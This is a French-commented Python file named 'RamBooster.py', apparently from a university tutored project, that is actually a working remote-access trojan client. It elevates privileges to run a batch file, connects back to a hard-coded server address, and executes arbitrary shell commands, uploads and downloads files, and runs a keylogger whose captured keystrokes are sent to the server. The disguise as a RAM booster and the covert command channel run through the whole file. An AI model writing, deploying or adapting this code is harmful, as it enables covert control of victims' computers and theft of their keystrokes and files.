# /**********************************************************************************************************************************************************************************

# Nom du fichier : RamBooster.py
# Rôle du fichier : Programme qui s'occupe de lancer le programme .bat et de se connecter au server.

# Auteur : Maxime BRONNY
# Version : V1
# Licence : Réalisé dans le cadre des cours "PROJET TUTEURE" L3 INFORMATIQUE IED
# Usage : Ce fichier s'exécute lors du lancement de l'interface graphique :
#           - LANCEMENT DE L'INTERFACE GRAPHIQUE : 
#               - python3 GUI.py

#           - Le fichier gérant l'interface graphique lance ce fichier avec la commande :
#               - python3 server.py

# *********************************************************************************************************************************************************************************/

# =============================================================================
# Importation des bibliothèques nécessaires
# =============================================================================

import socket         # Pour la gestion des connexions réseau (client TCP avec le serveur)
import subprocess     # Pour lancer des processus externes, notamment le .bat d'environnement
import threading      # Pour exécuter des tâches en parallèle (ex : keylogger, connexion persistante)
from pathlib import Path  # Pour manipuler les chemins de fichiers de façon portable
import sys            # Pour accéder à certains paramètres système et gérer l'environnement d'exécution
import ctypes         # Pour effectuer des appels système avancés (élévation des privilèges sous Windows)
from pynput.keyboard import Listener  # Pour intercepter les frappes clavier (keylogger)
import os             # Pour les opérations système (fichiers, répertoires, variables d'environnement)
import shutil         # Pour copier, déplacer ou supprimer des fichiers et dossiers
import time           # Pour la gestion du temps (pauses, timestamps, délais)
import random         # Pour générer des valeurs aléatoires (ex : identifiants temporaires)


# =============================================================================
# Fonction utilitaire pour lancer le programme .bat en mode administrateur
# =============================================================================

def run_as_admin_bat():
    bat_path = os.path.join(os.getcwd(), "setup_env.bat")
    params = f'/c "{bat_path}"'
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", params, None, 1)
    except:
        print("Échec de l'élévation.")

run_as_admin_bat()


# =============================================================================
# Fonction de gestion des touches pressées
# =============================================================================

def pressed(key):
    global allkeys
    allkeys += str(key)

# =============================================================================
# Fonction de gestion des touches relâchées
# =============================================================================

def released(key):
    pass

# =============================================================================
# Fonction pour démarrer le keylogger
# =============================================================================

def keylog():
    global l
    l = Listener(on_press=pressed, on_release=released)
    l.start()


# =============================================================================
# Classe pour gérer la connexion persistante
# =============================================================================

class PersistentConnection:
    def __init__(self, ip_address, port_number):
        self.ip_address = ip_address
        self.port_number = port_number
        self.socket = None
        self.connected = False
        self.last_activity = 0
        self.connection_attempts = 0
        self.max_backoff = 300  # Maximum backoff time in seconds
        self.heartbeat_interval = 60  # Send heartbeat every 60 seconds if no activity
        self.heartbeat_thread = None
        self.lock = threading.Lock()  # Pour protéger les accès concurrents au socket
        
    # =========================================================================================
    # Fonction pour établir une connexion au serveur avec backoff exponentiel en cas d'échec
    # =========================================================================================

    def connect(self):
        """Établit une connexion au serveur avec backoff exponentiel en cas d'échec"""
        if self.connected:
            return True
            
        # Backoff exponentiel avec jitter pour éviter les reconnexions synchronisées
        if self.connection_attempts > 0:
            backoff = min(10 * (2 ** self.connection_attempts), self.max_backoff)
            jitter = random.uniform(0.8, 1.2)
            sleep_time = backoff * jitter
            print(f"[*] Tentative de reconnexion dans {sleep_time:.1f} secondes...")
            time.sleep(sleep_time)
        
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(30)  # Timeout de 30 secondes pour la connexion
            self.socket.connect((self.ip_address, self.port_number))
            self.socket.settimeout(None)  # Pas de timeout pour les opérations normales
            self.connected = True
            self.connection_attempts = 0
            self.last_activity = time.time()
            print(f"[+] Connexion établie avec {self.ip_address}:{self.port_number}")
            
            # Démarrer le thread de heartbeat si pas déjà actif
            if not self.heartbeat_thread or not self.heartbeat_thread.is_alive():
                self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
                self.heartbeat_thread.start()
                
            return True
        except Exception as e:
            self.connected = False
            self.connection_attempts += 1
            print(f"[-] Échec de la connexion : {e}")
            return False
            
    # =========================================================================================
    # Fonction pour recevoir des données avec gestion des erreurs et reconnexion si nécessaire
    # =========================================================================================

    def recv(self, buffer_size=5120):
        """Reçoit des données avec gestion des erreurs et reconnexion si nécessaire"""
        with self.lock:
            self.last_activity = time.time()
            if not self.connected:
                return None  # Ne pas se reconnecter automatiquement
                    
            try:
                return self.socket.recv(buffer_size)
            except Exception as e:
                print(f"[-] Erreur de réception : {e}")
                self.connected = False
                return None
                
    # =========================================================================================
    # Fonction pour envoyer des données avec gestion des erreurs et reconnexion si nécessaire
    # =========================================================================================

    def send(self, data):
        """Envoie des données avec gestion des erreurs et reconnexion si nécessaire"""
        with self.lock:
            self.last_activity = time.time()
            if not self.connected:
                return False  # Ne pas se reconnecter automatiquement
                    
            try:
                if isinstance(data, str):
                    self.socket.send(data.encode())
                else:
                    self.socket.send(data)
                return True
            except Exception as e:
                print(f"[-] Erreur d'envoi : {e}")
                self.connected = False
                return False
                
    # =========================================================================================
    # Fonction pour fermer proprement la connexion
    # =========================================================================================

    def close(self):
        """Ferme proprement la connexion"""
        with self.lock:
            if self.connected and self.socket:
                try:
                    self.socket.close()
                except:
                    pass
            self.connected = False
            
    # =========================================================================================
    # Fonction pour envoyer périodiquement des heartbeats pour maintenir la connexion active
    # =========================================================================================

    def _heartbeat_loop(self):
        """Thread qui envoie périodiquement des heartbeats pour maintenir la connexion active"""
        while self.connected:
            time.sleep(5)  # Vérification toutes les 5 secondes
            
            with self.lock:
                # Si pas d'activité depuis heartbeat_interval secondes et toujours connecté
                if self.connected and time.time() - self.last_activity > self.heartbeat_interval:
                    try:
                        # Utiliser une commande "noop" qui ne fait rien mais maintient la connexion
                        # Le serveur ne répondra pas à cette commande, elle est juste ignorée
                        self.socket.send(b"HEARTBEAT")
                        self.last_activity = time.time()
                        print("[*] Heartbeat envoyé")
                    except Exception as e:
                        print(f"[-] Erreur de heartbeat : {e}")
                        self.connected = False


# =============================================================================
# Fonction principale pour lancer le client
# =============================================================================

def main():
    global allkeys, keylogging_ok

    # -----------------------------------------------------------------------------
    # Initialisation des variables globales
    # -----------------------------------------------------------------------------

    allkeys = ''
    keylogging_ok = 0
    ip_address = '192.168.1.58'
    port_number = 5001

    # -----------------------------------------------------------------------------
    # Création de la connexion persistante
    # -----------------------------------------------------------------------------

    conn = PersistentConnection(ip_address, port_number)
    
    # -----------------------------------------------------------------------------
    # Boucle principale avec nombre limité de tentatives
    # -----------------------------------------------------------------------------

    max_retries = 5
    retries = 0
    
    while retries < max_retries:
        # -----------------------------------------------------------------------------
        # Tenter d'établir la connexion
        # -----------------------------------------------------------------------------
        if not conn.connect():
            retries += 1
            if retries >= max_retries:
                print("[✖] Trop de tentatives, arrêt du client.")
                break
            continue
            
        try:
            while True:
                # -----------------------------------------------------------------------------
                # Réception des messages du serveur
                # -----------------------------------------------------------------------------
                data = conn.recv(5120)
                if not data:
                    print("[!] Connexion fermée par le serveur.")
                    conn.close()
                    break
                
                # -----------------------------------------------------------------------------
                # Traitement des messages reçus
                # -----------------------------------------------------------------------------
                msg = data.decode(errors='ignore')
                if msg == 'quit':
                    print("[!] Reçu 'quit', fermeture de la connexion.")
                    conn.close()
                    return
                    
                fullmsg = msg
                try:
                    msg = list(msg.split(" "))
                except:
                    print(msg)

                # -----------------------------------------------------------------------------
                # Commande de téléchargement (download)
                # -----------------------------------------------------------------------------
                if msg[0] == 'download':
                    try:
                        filename = msg[1]
                        with open(filename, 'rb') as f:
                            contents = f.read()
                        conn.send(contents)
                    except:
                        faildown = "Erreur lors du téléchargement"
                        conn.send(faildown.encode())
                        print("Échec de l'action")
                    continue

                # -----------------------------------------------------------------------------
                # Commande de test (TEST)
                # -----------------------------------------------------------------------------
                if fullmsg == 'TEST':
                    print("TEST CATCH")
                    conn.send('OK'.encode())
                    continue
                    
                # -----------------------------------------------------------------------------
                # Commande de heartbeat (HEARTBEAT)
                # -----------------------------------------------------------------------------
                if fullmsg == 'HEARTBEAT':
                    # Ignorer silencieusement, c'est juste pour maintenir la connexion
                    continue

                # -----------------------------------------------------------------------------
                # Commande systeminfo
                # -----------------------------------------------------------------------------
                if 'systeminfo' in fullmsg:
                    try:
                        print("[*] Exécution de la commande systeminfo...")
                        p = subprocess.Popen(fullmsg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                        output, error = p.communicate()
                        if output:
                            conn.send(output)
                            print("[+] Réponse systeminfo envoyée")
                        else:
                            conn.send(b"Erreur: pas de sortie systeminfo")
                    except Exception as e:
                        print(f"[-] Erreur systeminfo: {e}")
                        conn.send(f"Erreur: {e}".encode())
                    continue

                # -----------------------------------------------------------------------------
                # Commande de téléchargement (upload)
                # -----------------------------------------------------------------------------
                if msg[0] == 'upload':
                    try:
                        filename = msg[1]
                        filesize = int(msg[2])
                        contents = conn.recv(filesize)
                        with open(Path(filename), 'wb') as f:
                            f.write(contents)
                        conn.send('Fichier reçu'.encode())
                    except:
                        print("Échec de l'action")
                    continue

                # -----------------------------------------------------------------------------
                # Commande d'activation du keylogger (keylog on)
                # -----------------------------------------------------------------------------
                if fullmsg == 'keylog on':
                    try:
                        keylogging_ok = 1
                        t1 = threading.Thread(target=keylog)
                        t1.start()
                        conn.send("Keylogging commencé".encode())
                    except:
                        print("Échec de l'action")
                    continue

                # -----------------------------------------------------------------------------
                # Commande de désactivation du keylogger (keylog off)
                # -----------------------------------------------------------------------------
                if fullmsg == 'keylog off':
                    try:
                        if keylogging_ok == 1:
                            l.stop()
                            t1.join()
                            conn.send(allkeys.encode())
                            allkeys = ''
                            keylogging_ok = 0
                        else:
                            conn.send("Keylogger n'est pas activé".encode())
                    except:
                        print("Échec de l'action")
                    continue

                # -----------------------------------------------------------------------------
                # Commande mkdir et copy (mkdir/copy)
                # -----------------------------------------------------------------------------
                if 'mkdir' in fullmsg and 'copy' in fullmsg:
                    try:
                        print("[*] Exécution de la commande mkdir/copy...")
                        p = subprocess.Popen(fullmsg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                        output, error = p.communicate()
                        if output:
                            conn.send(output)
                        elif error:
                            conn.send(error)
                        else:
                            conn.send(b'Commande effectuee')
                        print("[+] Réponse mkdir/copy envoyée")
                    except Exception as e:
                        print(f"[-] Erreur mkdir/copy: {e}")
                        conn.send(f"Erreur: {e}".encode())
                    continue

                # -----------------------------------------------------------------------------
                # Exécution d'autres commandes
                # -----------------------------------------------------------------------------
                p = subprocess.Popen(fullmsg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                output, error = p.communicate()

                if len(output) > 0:
                    conn.send(output)
                elif len(error) > 0:
                    conn.send(error)
                else:
                    conn.send('Commande effectuée'.encode())

                # -----------------------------------------------------------------------------
                # Traitement des erreurs
                # -----------------------------------------------------------------------------

        except Exception as e:
            print(f"Erreur dans la boucle principale : {e}")
            # Ne pas fermer automatiquement en cas d'erreur, laisser la classe PersistentConnection gérer
        
        # Si on arrive ici, c'est que la boucle while True s'est arrêtée normalement
        # (connexion fermée par le serveur ou commande 'quit')
        print("[INFO] Sortie normale de la boucle de réception")
        break  # Sortir de la boucle de reconnexion
        
    # -----------------------------------------------------------------------------
    # Fermeture finale
    # -----------------------------------------------------------------------------

    conn.close()
    print("[INFO] Client arrêté")


# =============================================================================
# Lancement du client
# =============================================================================

main()